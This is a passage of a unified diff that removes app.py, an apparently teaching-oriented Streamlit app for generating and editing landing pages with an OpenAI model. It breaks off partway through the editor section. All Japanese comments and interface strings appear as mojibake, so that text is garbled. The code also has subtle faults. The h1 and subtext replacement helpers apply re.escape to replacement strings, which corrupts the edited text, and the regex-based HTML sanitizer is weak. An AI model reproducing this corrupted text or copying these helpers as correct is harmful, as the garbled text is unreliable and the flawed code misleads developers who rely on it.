--- app.py	2025-09-15 11:51:27
+++ streamlit_lp.ipynb	2025-09-15 11:31:23
@@ -1,496 +1,1053 @@
-# -*- coding: utf-8 -*-
-"""
-LPã‚¸ã‚§ãƒãƒ¬ãƒ¼ã‚¿ãƒ¼ï¼ˆæ•™æç‰ˆï¼‰
-- ç›®çš„: Streamlitã®åŸºæœ¬ã€œä¸­ç´šAPIã‚’ã€Œå…¬å¼ãƒ‰ã‚­ãƒ¥ãƒ¡ãƒ³ãƒˆã¨çªãåˆã‚ã›ãªãŒã‚‰ã€å­¦ã¶
-- ä¾å­˜: pip install -U openai streamlit python-dotenv
-- ä½¿ã„æ–¹:
-    1) .env ã« OPENAI_API_KEY ã‚’ä¿å­˜ï¼ˆä¾‹: OPENAI_API_KEY=sk-xxxxï¼‰
-    2) streamlit run v3.app.py
-"""
-
-from __future__ import annotations
-import os, io, re, json, base64, zipfile, random
-from typing import Dict, List, Tuple
-
-import streamlit as st
-# å…¬å¼: set_page_config / è¨­å®šé–¢é€£
-# https://docs.streamlit.io/develop/api-reference/configuration/st.set_page_config
-# https://docs.streamlit.io/develop/api-reference/configuration
-#
-# å…¬å¼: Session Stateï¼ˆçŠ¶æ…‹ã®ä¿æŒï¼‰
-# https://docs.streamlit.io/develop/api-reference/caching-and-state/st.session_state
-# https://docs.streamlit.io/develop/concepts/architecture/session-state
-#
-# å…¬å¼: ã‚«ã‚¹ã‚¿ãƒ HTMLã‚³ãƒ³ãƒãƒ¼ãƒãƒ³ãƒˆ
-# https://docs.streamlit.io/develop/api-reference/custom-components/st.components.v1.html
-import streamlit.components.v1 as components
-
-from openai import OpenAI
-from openai import RateLimitError, APIStatusError
-
-# å…¬å¼: secrets ã¨ secrets.toml
-# https://docs.streamlit.io/develop/api-reference/connections/st.secrets
-# https://docs.streamlit.io/develop/concepts/connections/secrets-management
-try:
-    # .env èª­ã¿è¾¼ã¿ï¼ˆç„¡ã‘ã‚Œã°ä½•ã‚‚ã—ãªã„ï¼‰
-    from dotenv import load_dotenv
-    load_dotenv()
-except Exception:
-    pass
-
-
-# â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€
-# ã‚»ã‚¯ã‚·ãƒ§ãƒ³1: APIã‚­ãƒ¼ã®å–å¾—ï¼ˆæ•™æãƒã‚¤ãƒ³ãƒˆ: ç’°å¢ƒå¤‰æ•°å„ªå…ˆã€secretsã¯ä¾‹å¤–å®‰å…¨ï¼‰
-# â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€
-def get_api_key(env_key: str = "OPENAI_API_KEY") -> str | None:
-    """
-    å…¬å¼ã‚¬ã‚¤ãƒ‰ãƒ©ã‚¤ãƒ³ã«æ²¿ã£ã¦ã€ã¾ãš OS ã®ç’°å¢ƒå¤‰æ•°ã‚’è¦‹ã‚‹ã€‚
-    ãƒ­ãƒ¼ã‚«ãƒ«é–‹ç™ºã§ã¯ .env + python-dotenv ã§ç’°å¢ƒå¤‰æ•°åŒ–ã™ã‚‹ã®ãŒå®‰å…¨ã€‚
-    Cloudç­‰ã§ secrets ã‚’ä½¿ã†å ´åˆã¯ã€try/exceptã§å‚ç…§ï¼ˆsecrets.tomlæœªé…ç½®ã§ã‚‚è½ã¡ãªã„ï¼‰ã€‚
-    """
-    key = os.getenv(env_key)
-    if key:
-        return key
-    try:
-        return st.secrets[env_key]  # secrets.toml ãŒç„¡ã„ç’°å¢ƒã§ã¯ KeyError ã§ã¯ãªããƒ‘ãƒ¼ã‚¹æ®µéšã§ä¾‹å¤–ã«ãªã‚‹å¯èƒ½æ€§ â†’ tryã§å¸å
-    except Exception:
-        return None
-
-
-API_KEY = get_api_key()
-if not API_KEY:
-    st.error(
-        "OpenAI APIã‚­ãƒ¼ãŒè¦‹ã¤ã‹ã‚Šã¾ã›ã‚“ã€‚\n\n"
-        "â–  æ¨å¥¨ï¼ˆãƒ­ãƒ¼ã‚«ãƒ«å­¦ç¿’å‘ã‘ï¼‰\n"
-        "  1) .env ã‚’ä½œæˆã— OPENAI_API_KEY=sk-xxxx ã‚’è¨˜è¼‰\n"
-        "  2) ã“ã®ã‚¢ãƒ—ãƒªã‚’å†å®Ÿè¡Œ\n\n"
-        "â–  å‚è€ƒï¼ˆsecrets ã‚’ä½¿ã†å ´åˆï¼‰\n"
-        "  .streamlit/secrets.toml ã« OPENAI_API_KEY ã‚’è¨˜è¼‰ï¼ˆâ€»ãƒªãƒã‚¸ãƒˆãƒªã«ã‚³ãƒŸãƒƒãƒˆã—ãªã„ï¼‰\n"
-        "  å…¬å¼: st.secrets / secrets.toml ã®ä½¿ã„æ–¹ã¯ãƒ‰ã‚­ãƒ¥ãƒ¡ãƒ³ãƒˆå‚ç…§"
-    )
-    st.stop()
-
-client = OpenAI(api_key=API_KEY)
-
-
-# â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€
-# ã‚»ã‚¯ã‚·ãƒ§ãƒ³2: ãƒšãƒ¼ã‚¸è¨­å®š / ã‚µã‚¤ãƒ‰ãƒãƒ¼UIï¼ˆæ•™æãƒã‚¤ãƒ³ãƒˆ: set_page_configãƒ»åŸºæœ¬ã‚¦ã‚£ã‚¸ã‚§ãƒƒãƒˆï¼‰
-# â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€
-st.set_page_config(
-    page_title="LPã‚¸ã‚§ãƒãƒ¬ãƒ¼ã‚¿ãƒ¼ï¼ˆAI + Editorï¼‰",
-    page_icon="âœ¨",
-    layout="wide",
-)
-
-st.title("âœ¨ LPã‚¸ã‚§ãƒãƒ¬ãƒ¼ã‚¿ãƒ¼ï¼ˆAIç”Ÿæˆ + Editorï¼‰")
-st.caption("â€œæ¯å›ã¡ãŒã†UIâ€ã‚’AIãŒç”Ÿæˆ â†’ å³ãƒšã‚¤ãƒ³ã§è‰²/æ–‡å­—/ç”»åƒã‚’ç·¨é›† â†’ AIå·®åˆ†ç·¨é›† â†’ ZIPå‡ºåŠ›")
-
-with st.sidebar:
-    st.header("åŸºæœ¬æƒ…å ±")
-    site_title = st.text_input("ã‚µã‚¤ãƒˆã‚¿ã‚¤ãƒˆãƒ« / åå‰", "Yamada Studio")
-    tagline    = st.text_input("ã‚­ãƒ£ãƒƒãƒã‚³ãƒ”ãƒ¼", "Design that ships.")
-    meta_desc  = st.text_input("meta description", "å°ã•ãé€Ÿãå‡ºã—ã¦ã€ç¶™ç¶šçš„ã«ç£¨ããŸã‚ã®ãƒ‡ã‚¶ã‚¤ãƒ³ã¨å®Ÿè£…ã€‚")
-    email      = st.text_input("é€£çµ¡å…ˆãƒ¡ãƒ¼ãƒ«", "hello@example.com")
-
-    st.divider()
-    st.header("ä¸–ç•Œè¦³ï¼ˆãƒ†ãƒ¼ãƒï¼‰")
-    theme = st.selectbox(
-        "Style Themeï¼ˆç”ŸæˆAIã«æ¸¡ã—ã¾ã™ï¼‰",
-        [
-            "ã‚·ãƒ³ãƒ—ãƒ«","ãƒ“ã‚¸ãƒã‚¹","å¯æ„›ã„","ã‚¹ã‚¿ã‚¤ãƒªãƒƒã‚·ãƒ¥","ãƒ¡ãƒ«ãƒ˜ãƒ³","ã‚¢ãƒ¡ã‚³ãƒŸé¢¨",
-            "å’Œé¢¨","å’Œãƒ¢ãƒ€ãƒ³","ãƒŸãƒ‹ãƒãƒ«","æœªæ¥çš„ï¼ˆã‚µã‚¤ãƒãƒ¼é¢¨ï¼‰","ãƒ¬ãƒˆãƒ­ãƒãƒƒãƒ—",
-            "ã‚¨ãƒ¬ã‚¬ãƒ³ãƒˆ","ãƒŠãƒãƒ¥ãƒ©ãƒ«","ãƒ€ãƒ¼ã‚¯ãƒ¢ãƒ¼ãƒ‰","é›‘èªŒé¢¨","ã‚¯ãƒ¼ãƒ«",
-        ],
-        index=0
-    )
-
-    st.divider()
-    st.header("ã‚³ãƒ³ãƒ†ãƒ³ãƒ„")
-    about_text   = st.text_area("Aboutæœ¬æ–‡", height=90, value="å¤§é˜ªã‚’æ‹ ç‚¹ã«ã€ã‚¹ãƒ”ãƒ¼ãƒ‰ã¨å“è³ªã‚’ä¸¡ç«‹ã™ã‚‹ãƒ‡ã‚¶ã‚¤ãƒ³ï¼†å®Ÿè£…ã‚’æä¾›ã—ã¦ã„ã¾ã™ã€‚å°ã•ãå‡ºã—ã¦ã€æ—©ãå­¦ã³ã€ç¶™ç¶šçš„ã«ç£¨ãã€‚")
-    features_csv = st.text_input("ç‰¹å¾´ï¼ˆã‚«ãƒ³ãƒåŒºåˆ‡ã‚Šï¼‰", "é«˜é€Ÿæ¤œè¨¼, æ˜å¿«ãªUI, ã‚¹ã‚±ãƒ¼ãƒ«è¨­è¨ˆ, é‹ç”¨ã—ã‚„ã™ã„, å“è³ªã¨ã‚¹ãƒ”ãƒ¼ãƒ‰, ãƒ‡ãƒ¼ã‚¿ãƒ‰ãƒªãƒ–ãƒ³")
-    works_csv    = st.text_input("å®Ÿç¸¾ï¼ˆã‚«ãƒ³ãƒåŒºåˆ‡ã‚Šï¼‰", "SaaSãƒ€ãƒƒã‚·ãƒ¥ãƒœãƒ¼ãƒ‰, ECç‰¹é›†, æ¡ç”¨ã‚µã‚¤ãƒˆ")
-    testi_raw    = st.text_area(
-        "ãŠå®¢æ§˜ã®å£°ï¼ˆåå‰|è‚©æ›¸ã|ã‚³ãƒ¡ãƒ³ãƒˆ ã‚’æ”¹è¡Œï¼‰",
-        height=80,
-        value="ä½è—¤ èŠ±å­|PM|æ„æ€æ±ºå®šãŒåœ§å€’çš„ã«é€Ÿããªã‚Šã¾ã—ãŸã€‚\néˆ´æœ¨ æ¬¡éƒ|BizDev|åˆé€Ÿã‹ã‚‰è³ªã¾ã§ã€ãƒãƒ©ãƒ³ã‚¹ãŒç´ æ™´ã‚‰ã—ã„ã€‚"
-    )
-
-    st.divider()
-    st.header("AI ç”Ÿæˆè¨­å®š")
-    temperature = st.slider("å¤šæ§˜æ€§ï¼ˆtemperatureï¼‰", 0.2, 1.4, 1.0, 0.1)
-
-
-# â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€
-# ã‚»ã‚¯ã‚·ãƒ§ãƒ³3: ãƒ¦ãƒ¼ãƒ†ã‚£ãƒªãƒ†ã‚£ï¼ˆæ•™æãƒã‚¤ãƒ³ãƒˆ: å°ã•ãªç´”ç²‹é–¢æ•°ã‚’ç©ã‚€ï¼‰
-# â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€
-def _split_csv(s: str) -> List[str]:
-    return [x.strip() for x in s.split(",") if x.strip()]
-
-def _parse_testimonials(s: str) -> List[Dict[str, str]]:
-    rows: List[Dict[str, str]] = []
-    for line in s.splitlines():
-        p = [u.strip() for u in line.split("|")]
-        if len(p) >= 3:
-            rows.append({"name": p[0], "role": p[1], "text": "|".join(p[2:])})
-    return rows
-
-def _sanitize_html(html: str) -> str:
-    # å…¬å¼: st.html ã‚‚ã‚µãƒ‹ã‚¿ã‚¤ã‚ºæ³¨æ„ï¼ˆDOMPurifyï¼‰â†’ æœ¬æ•™æã‚‚è‡ªå‰ã§æœ€ä½é™ã®é™¤å»
-    # https://docs.streamlit.io/develop/api-reference/text/st.html
-    html = re.sub(r"(?is)<script.*?>.*?</script>", "", html)
-    html = re.sub(r'(?is)\son\w+\s*=\s*(["\']).*?\1', "", html)  # onClick ç­‰
-    return html
-
-
-# â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€
-# ã‚»ã‚¯ã‚·ãƒ§ãƒ³4: ç”Ÿæˆãƒ—ãƒ­ãƒ³ãƒ—ãƒˆã¨OpenAIå‘¼ã³å‡ºã—ï¼ˆæ•™æãƒã‚¤ãƒ³ãƒˆ: ä¾‹å¤–ã®æ‰±ã„ï¼‰
-# â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€
-def _build_generate_prompt(theme: str, site_title: str, tagline: str, meta_desc: str,
-                           email: str, about: str, feats: list, works: list, testi: list, seed: int) -> str:
-    return f"""
-ã‚ãªãŸã¯LPãƒ‡ã‚¶ã‚¤ãƒŠãƒ¼å…¼ãƒ•ãƒ­ãƒ³ãƒˆã‚¨ãƒ³ãƒ‰ã§ã™ã€‚ä»¥ä¸‹ã®è¦ä»¶ã§ â€œå®ŒæˆHTML/CSSâ€ ã‚’ã‚¼ãƒ­ã‹ã‚‰ç”Ÿæˆã—ã¦ãã ã•ã„ã€‚
-
-# ã‚´ãƒ¼ãƒ«
-- ã€Œ{theme}ã€ã®ä¸–ç•Œè¦³ã§ã€**åˆè¦‹ã§é•ã„ãŒåˆ†ã‹ã‚‹**LPã‚’ä½œã‚‹
-- **HTMLã®æ§‹é€ **ãƒ»**è£…é£¾**ãƒ»**ã‚¿ã‚¤ãƒ**ãƒ»**ä½™ç™½**ãƒ»**ãƒ¢ãƒ¼ã‚·ãƒ§ãƒ³**ã¾ã§å¤‰ãˆã‚‹
-- å¤–éƒ¨CDN/JSã¯ä½¿ã‚ãªã„ï¼ˆç´”HTML+CSSï¼‰ã€‚ç”»åƒã¯ãƒ€ãƒŸãƒ¼çŸ©å½¢ã§OKã€‚
-
-# å…¥åŠ›ãƒ‡ãƒ¼ã‚¿
-- title: {site_title}
-- tagline: {tagline}
-- meta_description: {meta_desc}
-- email: {email}
-- about: {about}
-- features: {feats}
-- works: {works}
-- testimonials: {testi}
-- style_seed: {seed}
-
-# å³æ ¼ä»•æ§˜
-- å‡ºåŠ›ã¯ JSON 1å€‹ã®ã¿ã€‚ã‚¹ã‚­ãƒ¼ãƒ:
-  {{
-    "title": "string",
-    "meta": {{"description":"string"}},
-    "css": "string",             // <style>ãªã—ã€ç´”CSSã®ã¿
-    "body_html": "string"        // <body>å†…ã®ã¿ã€‚<html>/<head>ä¸è¦
-  }}
-
-# ãƒ‡ã‚¶ã‚¤ãƒ³æŒ‡é‡
-- åŒã˜ {theme} ã§ã‚‚æ¯å›**é…ç½®ãƒ»å½¢ãƒ»è£…é£¾**ãŒç•°ãªã‚‹ã“ã¨
-- ã‚»ã‚¯ã‚·ãƒ§ãƒ³æ•°/é †åº/ã‚°ãƒªãƒƒãƒ‰/è£…é£¾ï¼ˆæ³¢å½¢/ã‚¹ãƒ†ãƒƒã‚«ãƒ¼/æ /ã‚°ãƒ­ãƒ¼ç­‰ï¼‰ã‚’**æ¯å›å¤‰ãˆã‚‹**
-- :root ã§è‰²/è§’ä¸¸/å½±/ç·š/èƒŒæ™¯ãªã©ã®ãƒˆãƒ¼ã‚¯ãƒ³ã‚’å®šç¾©
-- ç”»åƒã¯ <div aria-label="image" class="img img--X"> ã®ã‚ˆã†ãªãƒ€ãƒŸãƒ¼
-- mailto: ã®CTAã‚’1ã¤ä»¥ä¸Š
-
-# ç¦æ­¢
-- <script>ã€å¤–éƒ¨URLã€@importã€å®Ÿãƒ•ã‚¡ã‚¤ãƒ«ç”»åƒã®èª­ã¿è¾¼ã¿
-"""
-
-def ai_generate(theme: str, site_title: str, tagline: str, meta_desc: str, email: str,
-                about: str, feats: list, works: list, testi: list, temperature: float) -> Tuple[str, str]:
-    seed = random.randint(1, 10_000_000)
-    prompt = _build_generate_prompt(theme, site_title, tagline, meta_desc, email, about, feats, works, testi, seed)
-    resp = client.chat.completions.create(
-        model="gpt-4o-mini",
-        temperature=temperature,
-        response_format={"type": "json_object"},
-        messages=[{"role": "user", "content": prompt}],
-    )
-    data = json.loads(resp.choices[0].message.content)
-    css  = data["css"]
-    body = _sanitize_html(data["body_html"])
-    return css, body
-
-
-# â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€
-# ã‚»ã‚¯ã‚·ãƒ§ãƒ³5: CSSãƒˆãƒ¼ã‚¯ãƒ³ç·¨é›†(:root)ãƒ»ç”»åƒå·®æ›¿ãˆãƒ»ãƒ†ã‚­ã‚¹ãƒˆç·¨é›†
-# â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€
-VAR_RE = re.compile(r":root\s*\{([^}]*)\}", re.S)
-IMG_PLACEHOLDER_RE = re.compile(
-    r'(<div[^>]*?(aria-label\s*=\s*"image"[^>]*|class\s*=\s*"[^"]*img[^"]*"[^>]*)>)(.*?)</div>',
-    re.I | re.S
-)
-
-def extract_root_vars(css_text: str) -> Dict[str, str]:
-    m = VAR_RE.search(css_text)
-    if not m: return {}
-    vars_: Dict[str, str] = {}
-    for line in m.group(1).split(";"):
-        if ":" in line:
-            k, v = line.split(":", 1)
-            if k.strip().startswith("--") and v.strip():
-                vars_[k.strip()] = v.strip()
-    return vars_
-
-def replace_root_vars(css_text: str, new_vars: Dict[str, str]) -> str:
-    def repl(match: re.Match) -> str:
-        block = match.group(1)
-        pairs, seen = [], set()
-        for ln in block.split(";"):
-            if ":" in ln:
-                k, v = ln.split(":", 1)
-                key = k.strip()
-                if key in new_vars:
-                    pairs.append(f"{key}: {new_vars[key]}"); seen.add(key)
-                else:
-                    pairs.append(f"{key}:{v}")
-        for k, v in new_vars.items():
-            if k not in seen: pairs.append(f"{k}: {v}")
-        return ":root{" + ";".join(pairs) + "}"
-    if not VAR_RE.search(css_text):
-        head = ":root{" + ";".join([f"{k}:{v}" for k, v in new_vars.items()]) + "}\n"
-        return head + css_text
-    return VAR_RE.sub(repl, css_text, count=1)
-
-def find_image_placeholders(html: str) -> List[Tuple[int, str]]:
-    return [(m.start(), m.group(0)) for m in IMG_PLACEHOLDER_RE.finditer(html)]
-
-def data_uri_from_file(file) -> Tuple[str, str]:
-    # å…¬å¼: file_uploader ã¯ BytesIO ã¨ã—ã¦ä¿æŒã•ã‚Œã‚‹
-    # https://docs.streamlit.io/develop/api-reference/widgets/st.file_uploader
-    # https://docs.streamlit.io/knowledge-base/using-streamlit/where-file-uploader-store-when-deleted
-    data = file.read()
-    mime = file.type or "application/octet-stream"
-    ext = "png"
-    if "jpeg" in mime: ext = "jpg"
-    elif "webp" in mime: ext = "webp"
-    b64 = base64.b64encode(data).decode("ascii")
-    return f"data:{mime};base64,{b64}", ext
-
-def replace_placeholder_with_img(html: str, placeholder_html: str, data_uri: str) -> str:
-    cls = ""
-    m = re.search(r'class\s*=\s*"([^"]+)"', placeholder_html, re.I)
-    if m: cls = m.group(1)
-    alt = "image"
-    m2 = re.search(r'aria-label\s*=\s*"([^"]+)"', placeholder_html, re.I)
-    if m2: alt = m2.group(1)
-    img = f'<img src="{data_uri}" alt="{alt}" class="{cls}"/>'
-    return html.replace(placeholder_html, img, 1)
-
-def extract_first_h1(html: str) -> str:
-    m = re.search(r"<h1[^>]*>(.*?)</h1>", html, re.S | re.I)
-    return (m.group(1).strip() if m else "")
-
-def replace_first_h1(html: str, new_text: str) -> str:
-    return re.sub(r"(<h1[^>]*>)(.*?)(</h1>)", r"\1" + re.escape(new_text) + r"\3",
-                  html, count=1, flags=re.S | re.I)
-
-def extract_subtext(html: str) -> str:
-    m = re.search(r"<(p|div)\s+class=['\"](sub|lead)['\"][^>]*>(.*?)</\1>", html, re.S | re.I)
-    return (m.group(3).strip() if m else "")
-
-def replace_subtext(html: str, new_text: str) -> str:
-    return re.sub(r"(<(p|div)\s+class=['\"](sub|lead)['\"][^>]*>)(.*?)(</\2>)",
-                  r"\1" + re.escape(new_text) + r"\5",
-                  html, count=1, flags=re.S | re.I)
-
-
-# â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€
-# ã‚»ã‚¯ã‚·ãƒ§ãƒ³6: ç”Ÿæˆãƒœã‚¿ãƒ³ã¨ Session Stateï¼ˆæ•™æãƒã‚¤ãƒ³ãƒˆ: å†å®Ÿè¡Œã«å¼·ã„è¨­è¨ˆï¼‰
-# â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€
-if "gen_html" not in st.session_state: st.session_state.gen_html = ""
-if "gen_css"  not in st.session_state: st.session_state.gen_css  = ""
-if "img_slots" not in st.session_state: st.session_state.img_slots = []
-
-gen_clicked = st.button("ğŸ¯ LPã‚’ç”Ÿæˆï¼ˆAIï¼‰", type="primary")
-
-if gen_clicked:
-    try:
-        css, body = ai_generate(
-            theme, site_title, tagline, meta_desc, email,
-            about_text, _split_csv(features_csv), _split_csv(works_csv), _parse_testimonials(testi_raw),
-            temperature
-        )
-    except RateLimitError as e:
-        st.error("ãƒ¬ãƒ¼ãƒˆä¸Šé™/ã‚¯ã‚©ãƒ¼ã‚¿ã«é”ã—ã¾ã—ãŸã€‚"); st.exception(e); st.stop()
-    except APIStatusError as e:
-        st.error(f"APIã‚¹ãƒ†ãƒ¼ã‚¿ã‚¹ã‚¨ãƒ©ãƒ¼: {e.status_code}"); st.exception(e); st.stop()
-    except Exception as e:
-        st.error("AIç”Ÿæˆã«å¤±æ•—ã—ã¾ã—ãŸï¼ˆã‚¤ãƒ³ã‚¹ãƒˆãƒ¼ãƒ«/ã‚­ãƒ¼/ãƒ¢ãƒ‡ãƒ«æ¨©é™ã‚’ã”ç¢ºèªãã ã•ã„ï¼‰ã€‚"); st.exception(e); st.stop()
-
-    html = f"""<!DOCTYPE html>
-<html lang="ja">
-<head>
-  <meta charset="utf-8" />
-  <meta name="viewport" content="width=device-width, initial-scale=1" />
-  <title>{site_title} â€“ Landing</title>
-  <meta name="description" content="{meta_desc}">
-  <link rel="stylesheet" href="./styles.css" />
-</head>
-<body>
-{body}
-</body>
-</html>"""
-
-    st.session_state.gen_html  = html
-    st.session_state.gen_css   = css
-    st.session_state.img_slots = find_image_placeholders(body)
-
-
-# â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€
-# ã‚»ã‚¯ã‚·ãƒ§ãƒ³7: ãƒ—ãƒ¬ãƒ“ãƒ¥ãƒ¼ï¼†ã‚¨ãƒ‡ã‚£ã‚¿ï¼ˆæ•™æãƒã‚¤ãƒ³ãƒˆ: components.html / å°ã•ãåæ˜ â†’å†æç”»ï¼‰
-# â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€
-if st.session_state.gen_html and st.session_state.gen_css:
-    colA, colB = st.columns([7, 5])
-
-    # ãƒ—ãƒ¬ãƒ“ãƒ¥ãƒ¼
-    with colA:
-        st.subheader("ğŸ” ãƒ—ãƒ¬ãƒ“ãƒ¥ãƒ¼")
-        body_only = st.session_state.gen_html.split("<body>", 1)[1].rsplit("</body>", 1)[0]
-        # å…¬å¼: st.components.v1.htmlï¼ˆiframeã§å®‰å…¨ã«åŸ‹ã‚è¾¼ã¿ï¼‰
-        # https://docs.streamlit.io/develop/api-reference/custom-components/st.components.v1.html
-        inline = f"""<!DOCTYPE html><html><head><meta charset='utf-8'>
-<meta name='viewport' content='width=device-width, initial-scale=1'>
-<style>{st.session_state.gen_css}</style></head><body>{body_only}</body></html>"""
-        components.html(inline, height=960, scrolling=True)
-
-    # ã‚¨ãƒ‡ã‚£ã‚¿
-    with colB:
-        st.subheader("ğŸ›  ã‚¨ãƒ‡ã‚£ã‚¿")
-
-        # :root å¤‰æ•°ç·¨é›†
-        vars_now = extract_root_vars(st.session_state.gen_css)
-        color_keys  = [k for k in vars_now if any(x in vars_now[k] for x in ["#", "rgb", "hsl"])]
-        radius_keys = [k for k in vars_now if "radius" in k or k == "--r"]
-
-        with st.expander("ğŸ¨ ã‚«ãƒ©ãƒ¼ & ãƒˆãƒ¼ã‚¯ãƒ³ç·¨é›†", expanded=True):
-            new_vars: Dict[str, str] = {}
-            for k in color_keys:
-                v = vars_now[k].strip()
-                # å…¬å¼: color_picker, text_input ç­‰ã®åŸºæœ¬ã‚¦ã‚£ã‚¸ã‚§ãƒƒãƒˆã¯å·¦ã®APIãƒªãƒ•ã‚¡ãƒ¬ãƒ³ã‚¹ä¸€è¦§ã‹ã‚‰ãŸã©ã‚Œã‚‹
-                new_vars[k] = st.color_picker(k, v) if v.startswith("#") and len(v) in (4, 7) else st.text_input(k, v)
-            for k in radius_keys:
-                m = re.search(r"(\d+)", vars_now[k]); init = int(m.group(1)) if m else 12
-                px = st.slider(f"{k}ï¼ˆpxï¼‰", 0, 40, init); new_vars[k] = f"{px}px"
-            if st.button("â¬† CSSã«åæ˜ "):
-                st.session_state.gen_css = replace_root_vars(st.session_state.gen_css, new_vars)
-                st.success("CSSï¼ˆ:rootï¼‰ã‚’æ›´æ–°ã—ã¾ã—ãŸã€‚")
-
-        # ãƒ†ã‚­ã‚¹ãƒˆç·¨é›†
